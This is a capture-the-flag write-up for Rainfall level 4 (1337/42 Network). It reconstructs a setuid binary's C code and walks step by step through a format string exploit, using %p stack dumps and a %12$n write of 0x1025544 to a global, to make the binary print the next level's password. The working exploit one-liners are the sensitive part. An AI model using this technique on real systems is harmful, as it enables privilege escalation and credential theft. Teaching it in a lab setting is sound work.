# ⛈ Rainfall Project — Level 4 Writeup
### Format String Vulnerability | 1337 / 42 Network

---

## Table of Contents

1. [How the Binary Works — C Reconstruction](#1-how-the-binary-works--c-reconstruction)
2. [Key Concept: Format String Vulnerability](#2-key-concept-format-string-vulnerability)
3. [Discovery Path — Step by Step](#3-discovery-path--step-by-step)
4. [How We Deduced the Exploit Path](#4-how-we-deduced-the-exploit-path)
5. [Method A — Finding the Offset](#5-method-a--finding-the-offset)
6. [Method B — Confirming the Target Address](#6-method-b--confirming-the-target-address)
7. [Method C — The Final Exploit](#7-method-c--the-final-exploit)
8. [What Actually Happens at Runtime](#8-what-actually-happens-at-runtime)
9. [Quick Reference Sheet](#9-quick-reference-sheet)

---

## 1. How the Binary Works — C Reconstruction

There are no source files, but from the GDB disassembly we can reconstruct the C code:

```c
#include <stdio.h>
#include <stdlib.h>

int m = 0;   // global variable at address 0x8049810

void p(char *buf) {
    printf(buf);   // ← FORMAT STRING BUG: should be printf("%s", buf)
}

void n(void) {
    char buf[520];
    fgets(buf, 512, stdin);
    p(buf);

    if (m == 0x1025544) {          // 16930116 in decimal
        system("/bin/cat /home/user/level5/.pass");
    }
}

int main(void) {
    n();
    return 0;
}
```

> **Key observation:** `p()` passes your input buffer **directly** to `printf()` as the format string.
> The global variable `m` must equal `16930116` (0x1025544) to trigger `system()` and print the password.

---

## 2. Key Concept: Format String Vulnerability

`printf()` reads **format specifiers** from your string and pops values off the stack.
If you control the format string, you can:

- **Read** arbitrary stack values → `%p` or `%x`
- **Read** arbitrary memory → `%s`
- **Write** an integer to any address → `%n`

### How `%n` works

`%n` writes the **number of characters printed so far** into the pointer passed as its argument.

```
printf("AAAA%10x%n", value, &target);
          ^^^^  ^^^
          4     10  = 14 total chars printed → writes 14 into target
```

Since our buffer **lives on the stack**, we can:
1. Place a target address at the start of our buffer
2. Use `%n` to write into that address

### Writing a large number without printing millions of characters

```c
printf("%16930112x%n");
//      ^^^^^^^^^^
//      field-width padding: prints the next stack value padded to 16930112 chars
//      total printed = 4 (address bytes) + 16930112 = 16930116
//      %n writes 16930116 into the pointer we placed on the stack
```

---

## 3. Discovery Path — Step by Step

### Step 1 — Basic recon

```bash
ls -la        # level4 is setuid level5 → if we exec anything it runs as level5
file level4   # 32-bit ELF, not stripped → symbols visible in GDB
./level4      # reads stdin, echoes it back → something processes our input
```

The **setuid bit** is the prize: if we force `system()` to run, it runs as level5 and can read the password file.

### Step 2 — Disassemble with GDB

```bash
gdb ./level4
(gdb) info functions     # shows: main, n, p — plus printf, fgets, system in PLT
(gdb) disas main         # main just calls n()
(gdb) disas n            # reads input, calls p(), then checks a global vs 0x1025544
(gdb) disas p            # calls printf(buf) ← the bug
```

**Critical values extracted from `disas n`:**

```asm
mov    0x8049810,%eax        ← global variable m lives at 0x8049810
cmp    $0x1025544,%eax       ← must equal 16930116
jne    ...
call   system(...)           ← win condition
```

### Step 3 — Confirm the format string bug with ltrace

```bash
ltrace ./level4 <<< "AAAA"
# Output: printf("AAAA\n")  ← printf called with OUR data as the format string!
```

`ltrace` confirms `printf()` receives our buffer as its **first argument** — a textbook format string vulnerability.

---

## 4. How We Deduced the Exploit Path

```
1. Binary is setuid level5
        → arbitrary execution wins the level

2. system() is already in the binary at a known address
        → no need to inject shellcode

3. The only condition: global m == 16930116
        → m is never assigned in code, so we must write to it

4. printf(buf) with no format string
        → we control format specifiers

5. %n writes to memory
        → we can write 16930116 into address 0x8049810

6. Our buffer sits on the stack
        → we can embed the address in the buffer
           and reference it with a positional specifier (%12$n)
```

> The positional specifier `%12$n` means:
> *"pop the 12th argument off the stack and treat it as a pointer to write into."*
> Since our buffer **is** argument 12, and our buffer **starts** with `0x8049810`, the write lands exactly where we need it.

---

## 5. Method A — Finding the Offset

We need to know **which argument number** our buffer occupies on the stack.
We send a recognizable marker (`AAAA` = `0x41414141`) and use `%p` to dump stack values:

```bash
python -c 'print "AAAA" + " %p" * 15' | ./level4
```

**Output:**
```
AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758
     0x804848d  0xbffff550 0x200      0xb7fd1ac0 0xb7ff37d0
     0x41414141  ← position 12!
     0x20702520 0x25207025 0x70252070
```

✅ `0x41414141` (our `AAAA`) appears at **position 12** → our buffer starts at argument 12.

---

## 6. Method B — Confirming the Target Address

Replace `AAAA` with the actual address we want to write to — `0x8049810` in **little-endian** bytes (`\x10\x98\x04\x08`):

```bash
python -c 'print "\x10\x98\x04\x08" + " %p" * 15' | ./level4
```

**Output:**
```
 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758
 0x804848d  0xbffff550 0x200      0xb7fd1ac0 0xb7ff37d0
 0x8049810  ← position 12 ✓
 0x20702520 0x25207025 0x70252070
```

✅ `0x8049810` appears at position 12 — confirmed.

### Why little-endian?

x86 stores bytes lowest-address first:

```
Address 0x08049810 → bytes in memory: 10 98 04 08
Python string:  "\x10\x98\x04\x08"
```

---

## 7. Method C — The Final Exploit

**Calculation:**

```
16930116   ← value we need to write (0x1025544)
−       4  ← bytes already printed (the 4-byte address)
─────────
 16930112  ← padding we need in the %x field width
```

### Interactive version (recommended — keeps stdin open)

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'; cat) | ./level4
```

### Direct version (prints password only)

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
```

### Anatomy of the format string

```
\x10\x98\x04\x08    → 4 bytes: address of m (0x8049810) in little-endian
%16930112x          → print next stack value padded to 16930112 chars wide
%12$n               → write total chars printed (= 16930116) into arg 12
                       arg 12 on the stack = our address = 0x8049810 = m
```

> ⚠️ **Shell quoting:** Use **single quotes** `'...'` around the python string.
> Inside single quotes, `$` does **not** need escaping.
> `\$n` is **wrong** — the backslash prevents `%n` from working.

---

## 8. What Actually Happens at Runtime

```
1.  fgets() reads our payload into buf[520] on the stack

2.  p(buf) is called → printf(buf) uses our string as the format

3.  printf reads "\x10\x98\x04\x08" → 4 bytes printed

4.  %16930112x → prints 16930112 more chars (hex-padded value)
    Total printed so far: 4 + 16930112 = 16930116

5.  %12$n → looks at arg12 on stack = 0x8049810
    Writes 16930116 (= 0x1025544) into that address
    → m = 0x1025544  ✓

6.  Back in n():  if (m == 0x1025544) → TRUE

7.  system("/bin/cat /home/user/level5/.pass") executes
    (as level5 because of setuid)

8.  Password printed to stdout  🎉
```

---

## 9. Quick Reference Sheet

| Item | Value |
|------|-------|
| Bug type | Format String Vulnerability (CWE-134) |
| Vulnerable call | `printf(buf)` instead of `printf("%s", buf)` |
| Target address | `0x8049810` (global variable `m`) |
| Required value | `0x1025544` = `16930116` decimal |
| Offset on stack | Argument **12** |
| Specifier used | `%12$n` (positional direct-write) |
| Byte order | Little-endian → `\x10\x98\x04\x08` |
| Padding needed | `16930116 − 4 = 16930112` |

### All commands in order

```bash
# Step 1 — find offset
python -c 'print "AAAA" + " %p" * 15' | ./level4

# Step 2 — confirm target address sits at offset 12
python -c 'print "\x10\x98\x04\x08" + " %p" * 15' | ./level4

#Step 3 have to method ^_^

# Step 3A — exploit (interactive, keeps shell open)
(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'; cat) | ./level4

#OR

# Step 3B — exploit (direct, prints password only)
python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
```

---

*Rainfall Level 4 Writeup · Binary Exploitation · 1337 / 42 Network*